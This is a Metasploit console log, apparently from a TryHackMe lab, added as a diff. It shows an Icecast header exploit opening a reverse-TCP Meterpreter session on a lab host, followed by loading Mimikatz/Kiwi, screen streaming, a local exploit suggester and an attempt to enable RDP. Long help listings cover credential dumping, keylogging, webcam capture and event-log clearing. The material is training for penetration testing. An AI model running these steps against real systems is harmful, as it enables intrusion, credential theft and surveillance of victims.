@@ -1,0 +1,1470 @@
+[1m[34m[*][0m Spooling to file console.log...
+[4mmsf5[0m [0m> ps
+[0m[1m[34m[*][0m exec: ps
+
+[4mmsf5[0m [0m> clear
+[0m[1m[34m[*][0m exec: clear
+
+[4mmsf5[0m [0m> ps
+[0m[1m[34m[*][0m exec: ps
+
+[4mmsf5[0m [0m> htop
+[0m[1m[34m[*][0m exec: htop
+
+Interrupt: use the 'exit' command to quit
+[4mmsf5[0m [0m> clear
+[0m[1m[34m[*][0m exec: clear
+
+[4mmsf5[0m [0m> help
+[0m
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    banner        Display an awesome metasploit banner
+    cd            Change the current working directory
+    color         Toggle color
+    connect       Communicate with a host
+    exit          Exit the console
+    get           Gets the value of a context-specific variable
+    getg          Gets the value of a global variable
+    grep          Grep the output of another command
+    help          Help menu
+    history       Show command history
+    load          Load a framework plugin
+    quit          Exit the console
+    repeat        Repeat a list of commands
+    route         Route traffic through a session
+    save          Saves the active datastores
+    sessions      Dump session listings and display information about sessions
+    set           Sets a context-specific variable to a value
+    setg          Sets a global variable to a value
+    sleep         Do nothing for the specified number of seconds
+    spool         Write console output into a file as well the screen
+    threads       View and manipulate background threads
+    tips          Show a list of useful productivity tips
+    unload        Unload a framework plugin
+    unset         Unsets one or more context-specific variables
+    unsetg        Unsets one or more global variables
+    version       Show the framework and console library version numbers
+
+
+Module Commands
+===============
+
+    Command       Description
+    -------       -----------
+    advanced      Displays advanced options for one or more modules
+    back          Move back from the current context
+    clearm        Clear the module stack
+    info          Displays information about one or more modules
+    listm         List the module stack
+    loadpath      Searches for and loads modules from a path
+    options       Displays global options or for one or more modules
+    popm          Pops the latest module off the stack and makes it active
+    previous      Sets the previously loaded module as the current module
+    pushm         Pushes the active or list of modules onto the module stack
+    reload_all    Reloads all modules from all defined module paths
+    search        Searches module names and descriptions
+    show          Displays modules of a given type, or all modules
+    use           Interact with a module by name or search term/index
+
+
+Job Commands
+============
+
+    Command       Description
+    -------       -----------
+    handler       Start a payload handler as job
+    jobs          Displays and manages jobs
+    kill          Kill a job
+    rename_job    Rename a job
+
+
+Resource Script Commands
+========================
+
+    Command       Description
+    -------       -----------
+    makerc        Save commands entered since start to a file
+    resource      Run the commands stored in a file
+
+
+Database Backend Commands
+=========================
+
+    Command           Description
+    -------           -----------
+    analyze           Analyze database information about a specific address or address range
+    db_connect        Connect to an existing data service
+    db_disconnect     Disconnect from the current data service
+    db_export         Export a file containing the contents of the database
+    db_import         Import a scan result file (filetype will be auto-detected)
+    db_nmap           Executes nmap and records the output automatically
+    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
+    db_remove         Remove the saved data service entry
+    db_save           Save the current data service connection as the default to reconnect on startup
+    db_status         Show the current data service status
+    hosts             List all hosts in the database
+    loot              List all loot in the database
+    notes             List all notes in the database
+    services          List all services in the database
+    vulns             List all vulnerabilities in the database
+    workspace         Switch between database workspaces
+
+
+Credentials Backend Commands
+============================
+
+    Command       Description
+    -------       -----------
+    creds         List all credentials in the database
+
+
+Developer Commands
+==================
+
+    Command       Description
+    -------       -----------
+    edit          Edit the current module or a file with the preferred editor
+    irb           Open an interactive Ruby shell in the current context
+    log           Display framework.log paged to the end if possible
+    pry           Open the Pry debugger on the current module or Framework
+    reload_lib    Reload Ruby library files from specified paths
+
+
+msfconsole
+==========
+
+`msfconsole` is the primary interface to Metasploit Framework. There is quite a
+lot that needs go here, please be patient and keep an eye on this space!
+
+Building ranges and lists
+-------------------------
+
+Many commands and options that take a list of things can use ranges to avoid
+having to manually list each desired thing. All ranges are inclusive.
+
+### Ranges of IDs
+
+Commands that take a list of IDs can use ranges to help. Individual IDs must be
+separated by a `,` (no space allowed) and ranges can be expressed with either
+`-` or `..`.
+
+### Ranges of IPs
+
+There are several ways to specify ranges of IP addresses that can be mixed
+together. The first way is a list of IPs separated by just a ` ` (ASCII space),
+with an optional `,`. The next way is two complete IP addresses in the form of
+`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
+specifications may also be used, however the whole address must be given to
+Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
+Additionally, a netmask can be used in conjunction with a domain name to
+dynamically resolve which block to target. All these methods work for both IPv4
+and IPv6 addresses. IPv4 addresses can also be specified with special octet
+ranges from the [NMAP target
+specification](https://nmap.org/book/man-target-specification.html)
+
+### Examples
+
+Terminate the first sessions:
+
+    sessions -k 1
+
+Stop some extra running jobs:
+
+    jobs -k 2-6,7,8,11..15
+
+Check a set of IP addresses:
+
+    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
+
+Target a set of IPv6 hosts:
+
+    set RHOSTS fe80::3990:0000/110, ::1-::f0f0
+
+Target a block from a resolved domain name:
+
+    set RHOSTS www.example.test/24
+[4mmsf5[0m [0m> get [K[K[K[Kset [K[K[K[Kset PAYLOAD windows/meterpreter/reverse_tcp
+[0mPAYLOAD => windows/meterpreter/reverse_tcp
+[4mmsf5[0m [0m> use icecast
+[0m[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_tcp
+
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/http/[45micecast[0m_header  2004-09-28       [32mgreat[0m  No     [45mIcecast[0m Header Overwrite
+
+
+[1m[34m[*][0m Using exploit/windows/http/icecast_header
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> use 0
+[0m[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_tcp
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> set rho[K[K[K[K[K[K[Kset LHOST 10.2.26.235
+[0mLHOST => 10.2.26.235
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> set Rh[KG[KHOST 10.10.43.32
+[0mRHOST => 10.10.43.32
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> use icecast
+[0m[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_tcp
+
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/http/[45micecast[0m_header  2004-09-28       [32mgreat[0m  No     [45mIcecast[0m Header Overwrite
+
+
+[1m[34m[*][0m Using exploit/windows/http/icecast_header
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> use 0
+[0m[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_tcp
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> run -j
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 10.2.26.235:4444 
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> [1m[34m[*][0m Sending stage (176195 bytes) to 10.10.43.32
+[1m[34m[*][0m Meterpreter session 1 opened (10.2.26.235:4444 -> 10.10.43.32:49229) at 2020-07-04 17:34:27 -0800
+[0m[0mjobs
+[0m
+Jobs
+====
+
+No active jobs.
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> jobs
+[0m
+Jobs
+====
+
+No active jobs.
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.2.26.235:4444 -> 10.10.43.32:49229 (10.10.43.32)
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> session -i 1
+[0m[1m[31m[-][0m Unknown command: session.
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> session -i 1s -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > clear
+[0m[1m[31m[-][0m Unknown command: clear.
+[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User          Path
+ ---   ----  ----                  ----  -------  ----          ----
+ 0     0     [System Process]                                   
+ 4     0     System                                             
+ 416   4     smss.exe                                           
+ 500   692   svchost.exe                                        
+ 544   536   csrss.exe                                          
+ 588   692   svchost.exe                                        
+ 592   536   wininit.exe                                        
+ 604   584   csrss.exe                                          
+ 652   584   winlogon.exe                                       
+ 692   592   services.exe                                       
+ 700   592   lsass.exe                                          
+ 708   592   lsm.exe                                            
+ 816   692   svchost.exe                                        
+ 884   692   svchost.exe                                        
+ 932   692   svchost.exe                                        
+ 1060  692   svchost.exe                                        
+ 1188  692   svchost.exe                                        
+ 1296  500   dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
+ 1316  1288  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
+ 1368  692   spoolsv.exe                                        
+ 1396  692   svchost.exe                                        
+ 1432  692   sppsvc.exe                                         
+ 1440  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
+ 1448  816   WmiPrvSE.exe                                       
+ 1548  692   amazon-ssm-agent.exe                               
+ 1640  692   LiteAgent.exe                                      
+ 1680  692   svchost.exe                                        
+ 1820  692   Ec2Config.exe                                      
+ 2020  692   svchost.exe                                        
+ 2228  692   TrustedInstaller.exe                               
+ 2288  1316  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
+ 2348  692   vds.exe                                            
+ 2572  692   SearchIndexer.exe                                  
+ 2732  816   rundll32.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\rundll32.exe
+ 2784  2732  dinotify.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\dinotify.exe
+ 2868  692   svchost.exe                                        
+
+[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > help
+[0m
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user's desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+[4mmeterpreter[0m > screenshare
+[0m[1m[34m[*][0m Preparing player...
+[1m[34m[*][0m Opening player at: /home/ckm8/Documents/TryHackMe/metasploit/pyZAHwND.html
+[1m[34m[*][0m Streaming...
+[1m[31m[-][0m Error running command screenshare: Interrupt 
+[4mmeterpreter[0m > clear
+[0m[1m[31m[-][0m Unknown command: clear.
+[4mmeterpreter[0m > help
+[0m
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user's desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+[4mmeterpreter[0m > load mimikatz
+[0mLoading extension mimikatz...[1m[33m[!][0m Loaded x86 Mimikatz on an x64 architecture.
+
+[1m[33m[!][0m Loaded Mimikatz on a newer OS (Windows 7 (6.1 Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?
+Success.
+[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > [K[4mmeterpreter[0m > load kiwi
+[0mLoading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+[1m[33m[!][0m Loaded x86 Kiwi on an x64 architecture.
+
+Success.
+[4mmeterpreter[0m > run post/windows/gather/checkvm
+[0m
+[1m[34m[*][0m Checking if DARK-PC is a Virtual Machine .....
+[1m[32m[+][0m This is a Xen Virtual Machine
+[4mmeterpreter[0m > run post/multi/recon/local_exploit_suggester
+[0m
+[1m[34m[*][0m 10.10.43.32 - Collecting local exploits for x86/windows...
+[1m[34m[*][0m 10.10.43.32 - 34 exploit checks are being tried...
+[1m[32m[+][0m 10.10.43.32 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.43.32 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.43.32 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.43.32 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.43.32 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.43.32 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.43.32 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.43.32 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.43.32 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[4mmeterpreter[0m > run post/windows/manage/enable_rdp
+[0m
+[1m[31m[-][0m Insufficient privileges, Remote Desktop Service was not modified
+[1m[34m[*][0m For cleanup execute Meterpreter resource file: /root/.msf4/loot/20200704175706_default_10.10.43.32_host.windows.cle_189971.txt
+[4mmeterpreter[0m > help
+[0m
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user's desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+
+Mimikatz Commands
+=================
+
+    Command           Description
+    -------           -----------
+    kerberos          Attempt to retrieve kerberos creds.
+    livessp           Attempt to retrieve livessp creds.
+    mimikatz_command  Run a custom command.
+    msv               Attempt to retrieve msv creds (hashes).
+    ssp               Attempt to retrieve ssp creds.
+    tspkg             Attempt to retrieve tspkg creds.
+    wdigest           Attempt to retrieve wdigest creds.
+
+
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+
+[4mmeterpreter[0m > run autorooute[K[K[K[Kute -h
+[0m
+[1m[33m[!][0m Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[1m[33m[!][0m Example: run post/multi/manage/autoroute OPTION=value [...]
+[1m[34m[*][0m Usage:   run autoroute [-r] -s subnet -n netmask
+[1m[34m[*][0m Examples:
+[1m[34m[*][0m   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
+[1m[34m[*][0m   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
+[1m[34m[*][0m   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
+[1m[34m[*][0m   run autoroute -p                            # Print active routing table
+[1m[34m[*][0m   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
+[1m[34m[*][0m Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
+[1m[31m[-][0m Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module
+[4mmeterpreter[0m > run autoroute -h[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kbacground[K[K[K[K[K[K[K[K[Ksearch server/socks4a
+[0m[1m[31m[-][0m You must specify a valid file glob to search for, e.g. >search -f *.doc
+[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> search server/socks4a
+[0m
+Matching Modules
+================
+
+   #  Name                      Disclosure Date  Rank    Check  Description
+   -  ----                      ---------------  ----    -----  -----------
+   0  auxiliary/[45mserver/socks4a[0m                   normal  No     Socks4a Proxy Server
+
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> Interrupt: use the 'exit' command to quit
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> search server/socks4a[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ksessions
+[0m
+Active sessions
+===============
+
